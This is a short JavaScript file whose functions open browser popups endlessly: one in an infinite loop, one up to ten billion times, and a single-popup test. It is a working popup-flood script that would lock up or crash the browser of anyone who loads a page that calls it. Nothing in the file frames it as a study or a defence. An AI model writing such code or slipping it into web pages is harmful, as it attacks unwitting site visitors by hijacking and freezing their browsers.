function ogautospam() {
  while (true) {
    window.open("./", "webWindow", "popup");
  }
}

function real_autospam() {
  const url = './';
  const numberOfPopups = 10000000000;

  let popupCounter = 0;
  while (popupCounter < numberOfPopups) {
    window.open(url, '_blank', 'width=500, height=300');
    popupCounter++;
  }
}

function linktest() {
  window.open("./", "webWindow", "popup");
}
